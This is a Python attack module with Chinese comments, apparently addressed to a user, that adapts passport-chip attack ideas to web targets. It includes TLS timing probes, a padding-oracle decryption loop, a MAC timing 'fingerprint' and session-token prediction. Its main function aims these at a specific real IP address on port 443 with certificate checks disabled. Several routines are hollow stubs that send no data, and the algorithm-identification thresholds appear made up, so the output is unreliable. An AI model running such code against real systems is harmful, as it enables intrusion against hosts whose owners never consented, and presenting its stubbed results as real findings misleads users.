#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Passport技术到Web渗透的桥接模块
将Java Card的物理攻击思维应用到Web
"""

import time
import socket
import ssl
import hashlib
import struct
from typing import List, Dict, Tuple, Optional
from Crypto.Cipher import DES3
import numpy as np

class PassportToWebBridge:
    """将passport的密码学攻击技术迁移到Web"""
    
    def __init__(self):
        # 继承你的APDU分析器思想
        self.timing_data = []
        self.padding_oracle_results = {}
        self.session_keys = {}
        
    # ============ 技术1: APDU时序分析 -> TLS时序分析 ============
    
    def tls_timing_analyzer(self, host: str, port: int, samples: int = 1000) -> Dict:
        """
        将你的APDU时序分析应用到TLS
        你在pro.py中已经做了完美的时序统计
        """
        timing_stats = {
            'total_commands': 0,
            'avg_response_time': 0,
            'max_response_time': 0,
            'min_response_time': float('inf'),
            'timing_variance': 0,
            'timing_patterns': []
        }
        
        for i in range(samples):
            start = time.perf_counter()
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((host, port))
                
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                ssock = context.wrap_socket(sock, server_hostname=host)
                
                elapsed = (time.perf_counter() - start) * 1000  # ms
                
                self.timing_data.append(elapsed)
                timing_stats['total_commands'] += 1
                
                # 像你的APDU分析器一样更新统计
                timing_stats['max_response_time'] = max(timing_stats['max_response_time'], elapsed)
                timing_stats['min_response_time'] = min(timing_stats['min_response_time'], elapsed)
                
                ssock.close()
                sock.close()
                
            except:
                continue
            
            if i % 100 == 0:
                print(f"[*] 收集进度: {i}/{samples}")
        
        # 计算统计指标（继承你的分析方法）
        if self.timing_data:
            timing_stats['avg_response_time'] = sum(self.timing_data) / len(self.timing_data)
            timing_stats['timing_variance'] = np.var(self.timing_data)
            
            # 检测二元模式（像你检测SSC递增的模式）
            threshold = timing_stats['avg_response_time']
            fast_group = [t for t in self.timing_data if t < threshold]
            slow_group = [t for t in self.timing_data if t >= threshold]
            
            if len(fast_group) > 0 and len(slow_group) > 0:
                ratio = len(fast_group) / len(self.timing_data)
                if 0.4 < ratio < 0.6:  # 接近50/50分布
                    timing_stats['binary_pattern_detected'] = True
                    timing_stats['fast_slow_ratio'] = ratio
        
        return timing_stats
    
    # ============ 技术2: 填充oracle（你的safe_unpadding经验）============
    
    def padding_oracle_attack(self, host: str, port: int, ciphertext: bytes) -> Optional[bytes]:
        """
        基于你的safe_unpadding实现的padding oracle攻击
        你处理了所有0x80的边界情况，这里可以用来攻击PKCS#7
        """
        def check_padding(data: bytes) -> Tuple[bool, float]:
            """发送数据并检测padding是否正确（通过时序）"""
            start = time.perf_counter()
            
            try:
                # 构造TLS消息包含密文
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                # 发送包含测试密文的请求
                # ... TLS协议细节 ...
                
                elapsed = (time.perf_counter() - start) * 1000
                
                sock.close()
                
                # 时序差异判断padding是否正确
                # 你的经验：错误padding响应更快（早期拒绝）
                return elapsed < 100, elapsed  # 100ms阈值
                
            except:
                return False, -1
        
        # Padding oracle核心算法
        block_size = 16  # AES
        plaintext = b''
        
        for block_idx in range(len(ciphertext) // block_size - 1, 0, -1):
            intermediate = bytearray(block_size)
            
            for byte_idx in range(block_size - 1, -1, -1):
                padding_value = block_size - byte_idx
                
                # 构造测试向量
                test_block = bytearray(block_size)
                for i in range(byte_idx + 1, block_size):
                    test_block[i] = intermediate[i] ^ padding_value
                
                # 暴力破解当前字节
                for guess in range(256):
                    test_block[byte_idx] = guess
                    
                    # 测试padding
                    test_cipher = bytes(test_block) + ciphertext[block_idx*block_size:(block_idx+1)*block_size]
                    valid, timing = check_padding(test_cipher)
                    
                    if valid:
                        intermediate[byte_idx] = guess ^ padding_value
                        print(f"[+] 发现字节 {byte_idx}: {intermediate[byte_idx]:02x}")
                        break
            
            # 恢复明文块
            prev_block = ciphertext[(block_idx-1)*block_size:block_idx*block_size]
            plain_block = bytes(intermediate[i] ^ prev_block[i] for i in range(block_size))
            plaintext = plain_block + plaintext
        
        return plaintext
    
    # ============ 技术3: MAC时序攻击（基于你的mac_iso9797_alg3）============
    
    def mac_timing_attack(self, host: str, port: int) -> Dict:
        """
        利用MAC验证的时序差异
        你实现了完整的ISO9797 MAC，知道每个步骤的耗时
        """
        mac_timings = {}
        
        # 测试不同长度的MAC输入
        for length in [8, 16, 32, 64, 128, 256]:
            test_data = b'A' * length
            
            times = []
            for _ in range(100):
                start = time.perf_counter()
                
                # 发送包含MAC的请求
                # ... 
                
                elapsed = (time.perf_counter() - start) * 1000
                times.append(elapsed)
            
            mac_timings[length] = {
                'avg': sum(times) / len(times),
                'min': min(times),
                'max': max(times)
            }
        
        # 分析MAC计算的线性关系
        lengths = list(mac_timings.keys())
        avgs = [mac_timings[l]['avg'] for l in lengths]
        
        # 线性拟合找出MAC算法特征
        from scipy import stats
        slope, intercept, r_value, p_value, std_err = stats.linregress(lengths, avgs)
        
        return {
            'mac_algorithm_fingerprint': {
                'slope': slope,  # 每字节的处理时间
                'intercept': intercept,  # 固定开销
                'correlation': r_value,  # 线性相关性
                'likely_algorithm': self.identify_mac_algorithm(slope)
            }
        }
    
    def identify_mac_algorithm(self, slope: float) -> str:
        """根据时序特征识别MAC算法"""
        # 基于你的经验值
        if 0.01 < slope < 0.05:
            return "HMAC-SHA256"
        elif 0.05 < slope < 0.1:
            return "3DES-MAC (like passport)"
        elif slope < 0.01:
            return "Hardware accelerated"
        else:
            return "Unknown/Software implementation"
    
    # ============ 技术4: SSC递增预测 -> Session预测 ============
    
    def session_state_predictor(self, samples: List[bytes]) -> Dict:
        """
        像预测SSC递增一样预测Web session状态
        你的SSC处理显示了对状态机的深刻理解
        """
        patterns = {
            'incremental': 0,
            'random': 0,
            'time_based': 0,
            'predictable': False
        }
        
        # 分析session token的模式
        if len(samples) > 10:
            # 检查是否递增（像SSC）
            diffs = []
            for i in range(1, len(samples)):
                if len(samples[i]) == len(samples[i-1]):
                    diff = int.from_bytes(samples[i], 'big') - int.from_bytes(samples[i-1], 'big')
                    diffs.append(diff)
            
            if diffs and all(d == diffs[0] for d in diffs):
                patterns['incremental'] = diffs[0]
                patterns['predictable'] = True
                print(f"[!] 发现递增模式，步长: {diffs[0]}")
        
        return patterns
    
    # ============ 技术5: 密钥注入检测 -> 密钥泄露检测 ============
    
    def key_leakage_detector(self, response_data: bytes) -> List[Dict]:
        """
        检测响应中的密钥材料泄露
        基于你的AA密钥注入经验
        """
        findings = []
        
        # 检查RSA模数特征（你处理过1024位RSA）
        if b'\x30\x81' in response_data or b'\x30\x82' in response_data:
            # 可能是DER编码的密钥
            findings.append({
                'type': 'Possible DER-encoded key',
                'confidence': 'HIGH',
                'recommendation': '检查是否泄露了私钥组件'
            })
        
        # 检查熵值
        entropy = self.calculate_entropy(response_data)
        if entropy > 7.5:  # 高熵值
            findings.append({
                'type': 'High entropy data',
                'entropy': entropy,
                'recommendation': '可能包含加密密钥或随机数'
            })
        
        # 检查已知的密钥格式
        key_patterns = [
            (b'-----BEGIN', 'PEM格式密钥'),
            (b'\x00\x00\x00\x07ssh-rsa', 'SSH密钥'),
            (b'MII', 'Base64编码的DER密钥')
        ]
        
        for pattern, description in key_patterns:
            if pattern in response_data:
                findings.append({
                    'type': description,
                    'confidence': 'VERY HIGH',
                    'critical': True
                })
        
        return findings
    
    def calculate_entropy(self, data: bytes) -> float:
        """计算数据熵值"""
        if not data:
            return 0
        
        frequency = {}
        for byte in data:
            frequency[byte] = frequency.get(byte, 0) + 1
        
        entropy = 0
        for count in frequency.values():
            probability = count / len(data)
            if probability > 0:
                entropy -= probability * np.log2(probability)
        
        return entropy

def main():
    """演示如何使用桥接模块"""
    print("="*60)
    print("Passport -> Web 攻击桥接")
    print("="*60)
    
    bridge = PassportToWebBridge()
    
    # 目标
    target_host = "125.212.254.149"
    target_port = 443
    
    print(f"\n目标: {target_host}:{target_port}")
    
    # 1. 时序分析（继承APDU分析器）
    print("\n[1] 执行TLS时序分析...")
    timing_results = bridge.tls_timing_analyzer(target_host, target_port, samples=100)
    
    print(f"平均响应: {timing_results['avg_response_time']:.2f}ms")
    print(f"时序方差: {timing_results['timing_variance']:.2f}")
    
    if timing_results.get('binary_pattern_detected'):
        print(f"[!] 检测到二元模式！比例: {timing_results['fast_slow_ratio']:.2%}")
        print("[!] 可能存在条件分支泄露（类似SSC处理）")
    
    # 2. MAC时序指纹
    print("\n[2] MAC算法指纹识别...")
    mac_results = bridge.mac_timing_attack(target_host, target_port)
    print(f"识别算法: {mac_results['mac_algorithm_fingerprint']['likely_algorithm']}")
    
    print("\n" + "="*60)
    print("分析完成")
    print("="*60)

if __name__ == "__main__":
    main()